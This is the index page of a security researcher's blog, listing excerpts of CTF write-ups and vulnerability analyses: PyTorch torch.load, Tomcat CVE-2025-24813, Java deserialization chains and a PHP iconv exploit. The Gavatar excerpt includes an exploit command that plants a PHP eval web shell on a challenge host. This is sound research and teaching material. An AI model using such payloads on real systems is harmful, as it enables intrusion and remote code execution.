
<!DOCTYPE html>
<html lang="en-us">
<head>
	<meta name="generator" content="Hugo 0.141.0"><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
    <title>GSBP&#39;s Blog</title>
    <meta name="description"
        content="A CTFER &amp;&amp; JavaSecurity Researcher">
    <link rel="canonical" href="http://localhost:1313/" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bulma/0.7.4/css/bulma.min.css">
    
    <link rel="stylesheet" href="http://localhost:1313/scss/style.min.badf012c7f163854e3d9c3287a1df0863ae1974f62e123bbf1f2948b58ed39cf.css">

    <meta property="og:url" content="http://localhost:1313/">
  <meta property="og:site_name" content="GSBP&#39;s Blog">
  <meta property="og:title" content="GSBP&#39;s Blog">
  <meta property="og:description" content="A CTFER &amp;&amp; JavaSecurity Researcher">
  <meta property="og:locale" content="en_us">
  <meta property="og:type" content="website">

    
  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="GSBP&#39;s Blog">
  <meta name="twitter:description" content="A CTFER &amp;&amp; JavaSecurity Researcher">

    

</head>
<body><nav class="navbar is-light" role="navigation">
    <div class="container">
        <div class="navbar-brand">
            <a href="/" title="home" class="navbar-item">
                <span class="logo">
                    <h1>GSBP&#39;s Blog</h1>
                </span>
            </a>

            
            <a id="theme-toggle" class="theme-toggle" href="#">
                <img src="http://localhost:1313/svg/sun.svg" alt="sun icon" class="theme-icon" />
            </a>

            <a role="button" class="navbar-burger" aria-label="menu" aria-expanded="false">
                <span aria-hidden="true"></span>
                <span aria-hidden="true"></span>
                <span aria-hidden="true"></span>
            </a>
        </div>

        <div class="navbar-menu">
            <div class="navbar-start">
                
                <a href="/about" class="navbar-item">About</a>
                
                <a href="/post" class="navbar-item">Blog</a>
                
                <a href="/categories" class="navbar-item">Categories</a>
                
                <a href="/friend" class="navbar-item">Friends</a>
                
            </div>

        </div>
        <div class="search">
            <div id="fastSearch">
                <input id="searchInput" tabindex="0" placeholder="Search..">
                <ul id="searchResults">

                </ul>
            </div>
            <a id="search-btn" style="display: inline-block;" href="# ">
                <div class="icon-search"><svg class="search-svg" xmlns="http://www.w3.org/2000/svg" width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line></svg></div>
            </a>
        </div>

        <script src="/js/fuse.min.js"></script> 
        <script src="/js/fastsearch.js"></script>

    </div>
</nav>

<script>
    
    document.addEventListener('DOMContentLoaded', function() {
        var burger = document.querySelector('.navbar-burger');
        burger.addEventListener('click', function() {
            burger.classList.toggle('is-active');
            document.querySelector('.navbar-menu').classList.toggle('is-active');
        });
    });

    
    function setTheme(theme) {
        let body = document.body;
        let themeIcon = document.querySelector(".theme-icon");
        if (theme === "dark") {
            body.classList.add("dark-mode");
            themeIcon.src = "http:\/\/localhost:1313\/svg/moon.svg";
            themeIcon.alt = "moon icon";
        } else {
            body.classList.remove("dark-mode");
            themeIcon.src = "http:\/\/localhost:1313\/svg/sun.svg";
            themeIcon.alt = "sun icon";
        }
        
        localStorage.setItem("theme", theme);
    }

    
    let theme = localStorage.getItem("theme") || "light";
    const isDarkMode = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches;
    if (isDarkMode) {
        
        setTheme('dark');

    } else {
        
        setTheme('light');
    }
    setTheme(theme);

    
    document.getElementById("theme-toggle").addEventListener("click", function() {
        if (theme === "light") {
            theme = "dark";
        } else {
            theme = "light";
        }
        setTheme(theme);
    });



</script>

</header><main>
<article>
    <div class="is-centered">
            <div class="title subtitle heading is-6">
                <div id="home-box" >
                            
                            <div class="avatar-container">
                                <img src="/img/GSBP.jpg" class="author-avatar">

                            </div>
                            



                        <h1 id="home-title" class="title is-1 ">GSBP&#39;s Blog</h1>
                    <div class="description column content typewriter-effect">
                        <div class="text" id="typewriter-text"> Interesting in CyberSecurity</div>

                    </div>
                    <script>
                        const typeWriter = document.getElementById('typewriter-text');
                        typeWriter.style.setProperty('--characters', typeWriter.innerHTML.length);
                    </script>

                    <div class="social-icon">

                        
                        <a href="https://github.com/GSBP0" title="Github"><span class="change-color icon">
                                <svg height="32px" width="32px" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
    stroke-linecap="round" stroke-linejoin="round">
    <path
        d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22">
    </path>
</svg>
                            </span></a>
                        
                        <a href="gsbp6279@gmail.com" title="email"><span class="change-color icon">
                                <svg height="32px" width="32px" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 21" fill="none" stroke="currentColor" stroke-width="2"
    stroke-linecap="round" stroke-linejoin="round">
    <path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path>
    <polyline points="22,6 12,13 2,6"></polyline>
</svg>
                            </span></a>
                        

                    </div>

                </div>
            </div>

    </div></article>
<div class="summary">
    
        <article class="post">
  <div class="single-container column is-centered">
    <div class="archive" id="post-container">
      <header class="post-header">
        <h1 class="post-title hover-underline-animation"><a class="post-link" href="/post/2025n1ctf-wp-for-n1cateezzjs/">[2025]N1CTF WP for n1cat,eezzjs</a></h1>
       
       
      </header>
      <div class="post-content">
        <div class="excerpt post-summary">
          <h2 id="tldr">TL;DR</h2>
<p>It&rsquo;s my first time to create challenges after i entered Nu1L Team. I&rsquo;m glad to see so many hackers could solve my challenges though they have few problems(Such as in eezzjs, flag is in <code>/flag</code> instead of <code>/ffffflag</code> because my new attachment did not update on competition platform in time). Here are my expected solutions for these challenges</p>
<h2 id="eezzjs">eezzjs</h2>
<p>In this challenges, your first work is to get a legal JWT that you could pass <code>authenticateJWT</code> middleware and use <code>/upload</code> to upload your file arbitrarily.</p>
        </div>
        
        <div class="post-time-container">
          <span class="post-time"> 2025-11-03 </span>
        </div>
      </div>
      
    </div>
  </div>
</article>

    
        <article class="post">
  <div class="single-container column is-centered">
    <div class="archive" id="post-container">
      <header class="post-header">
        <h1 class="post-title hover-underline-animation"><a class="post-link" href="/post/torch.load%E6%96%B0%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/">torch.load攻击新手法</a></h1>
       
       
      </header>
      <div class="post-content">
        <div class="excerpt post-summary">
          <h2 id="前言">前言</h2>
<p>博客太久没更了，找点东西更更XD。这次看BlackHat ppt传出来了就看到了个有意思的Pytorch漏洞，在四五月份的时候已经有相关cve了(CVE-2025-32434)，效果是即使torch.load的参数weights_only=True，也能够成功的RCE,不过能否成功rce也要看情况，细节看下文</p>
<h2 id="背景介绍">背景介绍</h2>
<h3 id="weights_only">weights_only</h3>
<p>此参数更多的是限制在torch.load中pickle反序列化的能力，在torch早版本时期，利用pickle常规payload能够直接进行代码注入，命令执行等高危操作。于是官方推出此参数来保护用户的安全。在2.6.0版本中正式引入，并且此后版本的pickle.load此参数的默认值为True，即开启保护。</p>
<h3 id="torchscript">TorchScript</h3>
<p>TorchScript 是 PyTorch 提供的一种中间表示形式，它把原本依赖 Python 的动态图模型转换为可序列化、可优化、可独立运行的静态图。通过 torch.jit.trace 或 torch.jit.script 可以生成 TorchScript 模型，并保存为 .pt 文件，用于跨平台部署（如 C++、移动端）。它既保留了 PyTorch 的灵活性，又解决了性能优化和摆脱 Python 环境依赖的问题。</p>
<h2 id="分析">分析</h2>
<p>​	为了方便理解，先拿出一个简单的demo出来</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> torch
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">MyModule</span>(torch<span style="color:#f92672">.</span>nn<span style="color:#f92672">.</span>Module):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> __init__(self):
</span></span><span style="display:flex;"><span>        super(MyModule, self)<span style="color:#f92672">.</span>__init__()
</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>linear <span style="color:#f92672">=</span> torch<span style="color:#f92672">.</span>nn<span style="color:#f92672">.</span>Linear(<span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">5</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">forward</span>(self):
</span></span><span style="display:flex;"><span>        print(<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> torch<span style="color:#f92672">.</span>zeros(<span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>module<span style="color:#f92672">=</span>MyModule()
</span></span><span style="display:flex;"><span>sc<span style="color:#f92672">=</span>torch<span style="color:#f92672">.</span>jit<span style="color:#f92672">.</span>script(module)
</span></span><span style="display:flex;"><span>sc<span style="color:#f92672">.</span>save(<span style="color:#e6db74">&#34;pytorch_model.bin&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>newModule<span style="color:#f92672">=</span>torch<span style="color:#f92672">.</span>load(<span style="color:#e6db74">&#34;pytorch_model.bin&#34;</span>,weights_only<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
</span></span><span style="display:flex;"><span>modins<span style="color:#f92672">=</span>newModule()
</span></span></code></pre></div><p>运行demo可以发现</p>
<p>
<div class="post-img-view">
<a data-fancybox="gallery" href="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250821150530808.png">
<img src="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250821150530808.png" alt="image-20250821150530808"  />
</a>
</div>

</p>
<p>此时我们可以通过这段demo理解到了一部份的漏洞实质，即这个漏洞并非只需要一个简单的load就能够进行攻击的，而是需要load后创造出来的对象进行一些方法调用才可以进行漏洞攻击，demo中使用的是对该对象进行实例化操作，该对象继承自nn.Module，在此过程中会自动的调用对应的forward方法，看下图代码</p>
<p>
<div class="post-img-view">
<a data-fancybox="gallery" href="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250821151243070.png">
<img src="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250821151243070.png" alt="image-20250821151243070"  />
</a>
</div>

</p>
<p>为了下一步的了解，我们理解到了forward方法能够被调用，那是否意味着我们能够写入任意代码呢，此时我们将forward方法改写成以下情况</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">forward</span>(self):
</span></span><span style="display:flex;"><span>        eval(<span style="color:#e6db74">&#34;print(1)&#34;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> torch<span style="color:#f92672">.</span>zeros(<span style="color:#ae81ff">0</span>)
</span></span></code></pre></div><p>运行后产生下图报错</p>
<p>
<div class="post-img-view">
<a data-fancybox="gallery" href="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250821151646558.png">
<img src="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250821151646558.png" alt="image-20250821151646558"  />
</a>
</div>

</p>
<pre tabindex="0"><code>Python builtin &lt;built-in function eval&gt; is currently not supported in Torchscript
</code></pre><p>这里就了解到了我们的Torchscript，可以看出我们的eval方法并不被Torchscript所支持，因为eval没有对应的TorchScript操作符。所以现在我们再次理解到了漏洞的又一部份实质，即只有在Torchscript中存在操作符的方法才能够被编译成TorchScript使用</p>
        </div>
        
        <div class="post-time-container">
          <span class="post-time"> 2025-08-25 </span>
        </div>
      </div>
      
    </div>
  </div>
</article>

    
        <article class="post">
  <div class="single-container column is-centered">
    <div class="archive" id="post-container">
      <header class="post-header">
        <h1 class="post-title hover-underline-animation"><a class="post-link" href="/post/d3ctf2025/">D3CTF 2025-WP</a></h1>
       
       
      </header>
      <div class="post-content">
        <div class="excerpt post-summary">
          <h2 id="前言">前言</h2>
<p>跟着Syc打的，web方向差一题ak，算是有点可惜了</p>
<h2 id="d3model">d3model</h2>
<p>题目内就一个app.py</p>
<pre tabindex="0"><code>import keras
from flask import Flask, request, jsonify
import os


def is_valid_model(modelname):
    try:
        keras.models.load_model(modelname)
    except Exception as e:
        print(e)
        return False
    return True

app = Flask(__name__)

@app.route(&#39;/&#39;, methods=[&#39;GET&#39;])
def index():
    return open(&#39;index.html&#39;).read()


@app.route(&#39;/upload&#39;, methods=[&#39;POST&#39;])
def upload_file():
    if &#39;file&#39; not in request.files:
        return jsonify({&#39;error&#39;: &#39;No file part&#39;}), 400
    
    file = request.files[&#39;file&#39;]
    
    if file.filename == &#39;&#39;:
        return jsonify({&#39;error&#39;: &#39;No selected file&#39;}), 400
    
    MAX_FILE_SIZE = 50 * 1024 * 1024  # 50MB
    file.seek(0, os.SEEK_END)
    file_size = file.tell()
    file.seek(0)
    
    if file_size &gt; MAX_FILE_SIZE:
        return jsonify({&#39;error&#39;: &#39;File size exceeds 50MB limit&#39;}), 400
    
    filepath = os.path.join(&#39;./&#39;, &#39;test.keras&#39;)
    if os.path.exists(filepath):
        os.remove(filepath)
    file.save(filepath)
    
    if is_valid_model(filepath):
        return jsonify({&#39;message&#39;: &#39;Model is valid&#39;}), 200
    else:

        return jsonify({&#39;error&#39;: &#39;Invalid model file&#39;}), 400

if __name__ == &#39;__main__&#39;:
    app.run(host=&#39;0.0.0.0&#39;, port=5001)
</code></pre><p>代码也没啥好审的，很明显就只有一个keras.models.load_model(modelname)能当作sink点，去网上搜一下相关漏洞就能找到现成的payload，题目不出网，外带到index.html即可</p>
        </div>
        
        <div class="post-time-container">
          <span class="post-time"> 2025-06-01 </span>
        </div>
      </div>
      
    </div>
  </div>
</article>

    
        <article class="post">
  <div class="single-container column is-centered">
    <div class="archive" id="post-container">
      <header class="post-header">
        <h1 class="post-title hover-underline-animation"><a class="post-link" href="/post/k8slanparty-wp/">K8slanparty WP</a></h1>
       
       
      </header>
      <div class="post-content">
        <div class="excerpt post-summary">
          <hr>
<h2 id="dnsing-with-the-stars">DNSing with the stars</h2>
<hr>
<blockquote>
<p>You have shell access to compromised a Kubernetes pod at the bottom of this page, and your next objective is to compromise other internal services further.</p>
<p>As a warmup, utilize <a href="https://thegreycorner.com/2023/12/13/kubernetes-internal-service-discovery.html#kubernetes-dns-to-the-partial-rescue">DNS scanning</a> to uncover hidden internal services and obtain the flag. We have &ldquo;loaded your machine with <a href="https://gist.github.com/nirohfeld/c596898673ead369cb8992d97a1c764e">dnscan</a> to ease this process for further challenges.</p>
<p>All the flags in the challenge follow the same format: wiz_k8s_lan_party{*}</p>
</blockquote>
<hr>
<p>根据题目信息可以知道是利用dnscan寻找k8s主机</p>
<p>通过env可以发现k8s的一些信息，比如service主机地址</p>
        </div>
        
        <div class="post-time-container">
          <span class="post-time"> 2025-05-15 </span>
        </div>
      </div>
      
    </div>
  </div>
</article>

    
        <article class="post">
  <div class="single-container column is-centered">
    <div class="archive" id="post-container">
      <header class="post-header">
        <h1 class="post-title hover-underline-animation"><a class="post-link" href="/post/%E8%BD%AF%E4%BB%B6%E6%94%BB%E9%98%B2%E8%B5%9B%E7%8E%B0%E5%9C%BA%E8%B5%9B%E4%B8%8A%E5%AF%B9justdeserialize%E6%94%BB%E5%87%BB%E7%9A%84%E5%87%A0%E6%AC%A1%E5%B0%9D%E8%AF%95/">软件攻防赛现场赛上对justDeserialize攻击的几次尝试</a></h1>
       
       
      </header>
      <div class="post-content">
        <div class="excerpt post-summary">
          <h2 id="前言">前言</h2>
<p>一个关于本地打通无数次但远程0次的故事</p>
<h2 id="题目分析">题目分析</h2>
<p>题目直接给了一个反序列化的入口点</p>
<p>
<div class="post-img-view">
<a data-fancybox="gallery" href="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250324233735530.png">
<img src="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250324233735530.png" alt="image-20250324233735530"  />
</a>
</div>

</p>
<p>其中有两层防御</p>
<ul>
<li>对我们的反序列化数据流中的明文进行简单判断过滤</li>
<li>使用了一个自定义反序列化类来对我们的反序列化数据流进行反序列化</li>
</ul>
<p>其中自定义化反序列化类代码如下</p>
<pre tabindex="0"><code>//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by FernFlower decompiler)
//

package com.example.ezjav.utils;

import java.io.BufferedReader;
import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.InvalidClassException;
import java.io.ObjectInputStream;
import java.io.ObjectStreamClass;
import java.util.ArrayList;

public class MyObjectInputStream extends ObjectInputStream {
    private String[] denyClasses;

    public MyObjectInputStream(ByteArrayInputStream var1) throws IOException {
        super(var1);
        ArrayList&lt;String&gt; classList = new ArrayList();
        InputStream file = MyObjectInputStream.class.getResourceAsStream(&#34;/blacklist.txt&#34;);
        BufferedReader var2 = new BufferedReader(new InputStreamReader(file));

        String var4;
        while((var4 = var2.readLine()) != null) {
            classList.add(var4.trim());
        }

        this.denyClasses = new String[classList.size()];
        classList.toArray(this.denyClasses);
    }

    protected Class&lt;?&gt; resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
        String className = desc.getName();
        int var5 = this.denyClasses.length;

        for(int var6 = 0; var6 &lt; var5; ++var6) {
            String denyClass = this.denyClasses[var6];
            if (className.startsWith(denyClass)) {
                throw new InvalidClassException(&#34;Unauthorized deserialization attempt&#34;, className);
            }
        }

        return super.resolveClass(desc);
    }
}
</code></pre><p>从<strong>blacklist</strong>中读取baned类，且在<code>resolveClass</code>中进行过滤</p>
        </div>
        
        <div class="post-time-container">
          <span class="post-time"> 2025-03-24 </span>
        </div>
      </div>
      
    </div>
  </div>
</article>

    
        <article class="post">
  <div class="single-container column is-centered">
    <div class="archive" id="post-container">
      <header class="post-header">
        <h1 class="post-title hover-underline-animation"><a class="post-link" href="/post/tomcatcve-2025-24813%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/">[Tomcat]CVE-2025-24813复现及原理分析</a></h1>
       
       
      </header>
      <div class="post-content">
        <div class="excerpt post-summary">
          <h2 id="前言">前言</h2>
<p>出了个通告说Tomcat有个新的cve，于是来尝试复现分析一下</p>
<h2 id="通报">通报</h2>
<p>关于漏洞的通报细节如下</p>
<p>
<div class="post-img-view">
<a data-fancybox="gallery" href="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250312143659450.png">
<img src="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250312143659450.png" alt="image-20250312143659450"  />
</a>
</div>

</p>
<p>一看又是DefaultServlet的put方法上出的洞，这里漏洞利用有两种形式，一个是信息泄漏和篡改，还有一个是反序列化RCE，而且要求的前置项有点多，这里简单列出来</p>
<h3 id="信息泄漏篡改">信息泄漏/篡改</h3>
<ul>
<li>
<p>ReadOnly为false</p>
</li>
<li>
<p>支持partial PUT方法</p>
</li>
<li>
<p>攻击者知道敏感文件的名称</p>
</li>
<li>
<p>安全敏感文件的上传目标 URL 是公开上传目标 URL 的子目录（？这个看不懂，也不知道啥意思）</p>
</li>
</ul>
<h3 id="反序列化rce">反序列化RCE</h3>
<ul>
<li>ReadOnly为false</li>
<li>支持partial PUT方法</li>
<li>服务开启以文件为存储形式的持久化链接，并且采用默认位置</li>
<li>有能够引起反序列化漏洞的依赖</li>
</ul>
<h2 id="环境搭建">环境搭建</h2>
<p>我参考的这篇文章搭建的环境</p>
<p><a href="https://juejin.cn/post/7331544684290228250">https://juejin.cn/post/7331544684290228250</a></p>
<p>接下来修改readonly</p>
<p><code>tomcat目录/conf/web.xml</code></p>
<pre tabindex="0"><code>    &lt;servlet&gt;
        &lt;servlet-name&gt;default&lt;/servlet-name&gt;
        &lt;servlet-class&gt;org.apache.catalina.servlets.DefaultServlet&lt;/servlet-class&gt;
        &lt;init-param&gt;
            &lt;param-name&gt;debug&lt;/param-name&gt;
            &lt;param-value&gt;0&lt;/param-value&gt;
        &lt;/init-param&gt;
        &lt;init-param&gt;
            &lt;param-name&gt;listings&lt;/param-name&gt;
            &lt;param-value&gt;false&lt;/param-value&gt;
        &lt;/init-param&gt;
      &lt;init-param&gt;
        &lt;param-name&gt;readonly&lt;/param-name&gt;
        &lt;param-value&gt;false&lt;/param-value&gt;
      &lt;/init-param&gt;
        &lt;load-on-startup&gt;1&lt;/load-on-startup&gt;
    &lt;/servlet&gt;
</code></pre><p>开启持久化链接文件模式</p>
<p><code>tomcat目录/conf/context.xml</code></p>
<pre tabindex="0"><code>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;
&lt;!--
  Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  (the &#34;License&#34;); you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an &#34;AS IS&#34; BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
--&gt;
&lt;!-- The contents of this file will be loaded for each web application --&gt;
&lt;Context&gt;

    &lt;!-- Default set of monitored resources. If one of these changes, the    --&gt;
    &lt;!-- web application will be reloaded.                                   --&gt;
    &lt;WatchedResource&gt;WEB-INF/web.xml&lt;/WatchedResource&gt;
    &lt;WatchedResource&gt;WEB-INF/tomcat-web.xml&lt;/WatchedResource&gt;
    &lt;WatchedResource&gt;${catalina.base}/conf/web.xml&lt;/WatchedResource&gt;

    &lt;!-- Uncomment this to disable session persistence across Tomcat restarts --&gt;
    &lt;!--
    &lt;Manager pathname=&#34;&#34; /&gt;
    --&gt;
  &lt;Manager className=&#34;org.apache.catalina.session.PersistentManager&#34;
           debug=&#34;0&#34;
           saveOnRestart=&#34;false&#34;
           maxActiveSession=&#34;-1&#34;
           minIdleSwap=&#34;-1&#34;
           maxIdleSwap=&#34;-1&#34;
           maxIdleBackup=&#34;-1&#34;&gt;
    &lt;Store className=&#34;org.apache.catalina.session.FileStore&#34; directory=&#34;&#34;/&gt;
  &lt;/Manager&gt;
&lt;/Context&gt;
</code></pre><p>往pom.xml下塞入CC依赖</p>
        </div>
        
        <div class="post-time-container">
          <span class="post-time"> 2025-03-12 </span>
        </div>
      </div>
      
    </div>
  </div>
</article>

    
        <article class="post">
  <div class="single-container column is-centered">
    <div class="archive" id="post-container">
      <header class="post-header">
        <h1 class="post-title hover-underline-animation"><a class="post-link" href="/post/2025n1junior-wp/">[2025]N1junior-WP</a></h1>
       
       
      </header>
      <div class="post-content">
        <div class="excerpt post-summary">
          <h2 id="gavatar">Gavatar</h2>
<p>一个php服务</p>
<p>这里看upload.php有着很明显的任意文件读的漏洞，只需要post一个url参数就可以</p>
<pre tabindex="0"><code>if (!empty($_FILES[&#39;avatar&#39;][&#39;tmp_name&#39;])) {
    $finfo = new finfo(FILEINFO_MIME_TYPE);
    if (!in_array($finfo-&gt;file($_FILES[&#39;avatar&#39;][&#39;tmp_name&#39;]), [&#39;image/jpeg&#39;, &#39;image/png&#39;, &#39;image/gif&#39;])) {
        die(&#39;Invalid file type&#39;);
    }
    move_uploaded_file($_FILES[&#39;avatar&#39;][&#39;tmp_name&#39;], $avatarPath);
} elseif (!empty($_POST[&#39;url&#39;])) {
    $image = @file_get_contents($_POST[&#39;url&#39;]);
    if ($image === false) die(&#39;Invalid URL&#39;);
    file_put_contents($avatarPath, $image);
}
</code></pre><p>flag也不能直接读，需要rce调用/readflag，然后就开始想能不能和其他php文件下的漏洞一起利用</p>
<p>也是没有其他能够接着利用的漏洞了，然后看到php版本是8.3.4，就想到那个iconv的漏洞利用</p>
<p><a href="https://www.ambionics.io/blog/iconv-cve-2024-2961-p1">https://www.ambionics.io/blog/iconv-cve-2024-2961-p1</a></p>
<p>因为不是直接返回文件内容，而是需要我们从<code>avatar.php</code>中获取，这里需要稍微改一下脚本中的download函数，要提前注册一个用户，然后把session和user填上即可</p>
<pre tabindex="0"><code>    def download(self, path: str) -&gt; bytes:
        &#34;&#34;&#34;Returns the contents of a remote file.
        &#34;&#34;&#34;
        path = f&#34;php://filter/convert.base64-encode/resource={path}&#34;
        self.send(path)
        response=self.session.get(&#34;http://39.106.16.204:20871/avatar.php?user=123&#34;)
        print(response)
        data = response.text
        return base64.decode(data)
</code></pre><p>然后跑exp就好了</p>
<pre tabindex="0"><code>python test.py http://39.106.16.204:20871/upload.php &#34;echo &#39;&lt;?=@eval(\$_POST[0]);?&gt;&#39; &gt; shell.php&#34;
</code></pre><p>
<div class="post-img-view">
<a data-fancybox="gallery" href="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250211210919337.png">
<img src="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250211210919337.png" alt="image-20250211210919337"  />
</a>
</div>

</p>
        </div>
        
        <div class="post-time-container">
          <span class="post-time"> 2025-02-11 </span>
        </div>
      </div>
      
    </div>
  </div>
</article>

    
        <article class="post">
  <div class="single-container column is-centered">
    <div class="archive" id="post-container">
      <header class="post-header">
        <h1 class="post-title hover-underline-animation"><a class="post-link" href="/post/springaop/">SpringAOP链学习</a></h1>
       
       
      </header>
      <div class="post-content">
        <div class="excerpt post-summary">
          <h2 id="前言">前言</h2>
<p>在浏览文章的时候看见有师傅发现了一条仅依赖于Springboot中的SpringAOP的链，于是自己调试学习了一下</p>
<h2 id="正文">正文</h2>
<p>依赖于Spring-AOP和aspectjweaver两个包，但是springboot中的spring-boot-starter-aop自带包含这俩类</p>
<h3 id="流程">流程</h3>
<p>调用链如下</p>
<pre tabindex="0"><code>JdkDynamicAopProxy.invoke()-&gt;
ReflectiveMethodInvocation.proceed()-&gt;
AspectJAroundAdvice-&gt;invoke-&gt;
org.springframework.aop.aspectj.AbstractAspectJAdvice.invokeAdviceMethod()-&gt;
method.invoke()
</code></pre><p>执行类是<code>org.springframework.aop.aspectj.AbstractAspectJAdvice</code>的<strong>invokeAdviceMethodWithGivenArgs</strong>方法</p>
<p>
<div class="post-img-view">
<a data-fancybox="gallery" href="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250123020448769.png">
<img src="https://tuchuang-1322176132.cos.ap-chengdu.myqcloud.com//imgimage-20250123020448769.png" alt="image-20250123020448769"  />
</a>
</div>

</p>
<pre tabindex="0"><code>    protected Object invokeAdviceMethodWithGivenArgs(Object[] args) throws Throwable {
        Object[] actualArgs = args;
        if (this.aspectJAdviceMethod.getParameterCount() == 0) {
            actualArgs = null;
        }

        try {
            ReflectionUtils.makeAccessible(this.aspectJAdviceMethod);
            return this.aspectJAdviceMethod.invoke(this.aspectInstanceFactory.getAspectInstance(), actualArgs);
        } catch (IllegalArgumentException ex) {
            throw new AopInvocationException(&#34;Mismatch on arguments to advice method [&#34; + this.aspectJAdviceMethod + &#34;]; pointcut expression [&#34; + this.pointcut.getPointcutExpression() + &#34;]&#34;, ex);
        } catch (InvocationTargetException ex) {
            throw ex.getTargetException();
        }
    }
</code></pre><p>直接在AOP依赖下的一个sink点，有着反射执行任意方法的能力，操作空间很大</p>
        </div>
        
        <div class="post-time-container">
          <span class="post-time"> 2025-01-23 </span>
        </div>
      </div>
      
    </div>
  </div>
</article>

    
        <article class="post">
  <div class="single-container column is-centered">
    <div class="archive" id="post-container">
      <header class="post-header">
        <h1 class="post-title hover-underline-animation"><a class="post-link" href="/post/jdk17%E6%89%93jackson&#43;ldapattruibute%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">JDK17打Jackson&#43;LdapAttruibute反序列化</a></h1>
       
       
      </header>
      <div class="post-content">
        <div class="excerpt post-summary">
          <h2 id="起因">起因</h2>
<p>本月五号的时候打了个软件攻防赛，里面有道java当时没做出来，用的ldapAttribute+Jackson死活没通，后面自己调试了一下，这里做个记录</p>
<h2 id="题目分析">题目分析</h2>
<p>题目名叫<code>JDBCParty</code>,jdk版本是17，里面给了个接口源码如下</p>
<pre tabindex="0"><code>    @PostMapping({&#34;/dbtest&#34;})
    public ResponseEntity&lt;String&gt; dbtest(String data) {
        try {
            User credentials = (User)Utils.deserialize(data);
            Class.forName(this.driverClassName);

            try (Connection connection = DriverManager.getConnection(this.url, credentials.getUsername(), credentials.getPassword())) {
                if (connection.isValid(5)) {
                    return ResponseEntity.ok(&#34;connect success&#34;);
                } else {
                    return ResponseEntity.status(HttpStatus.INTERNAL_SERVER_ERROR).body(&#34;connect failed&#34;);
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
            return ResponseEntity.status(HttpStatus.INTERNAL_SERVER_ERROR).body(&#34;connect failed &#34; + e.getMessage());
        }
    }
}
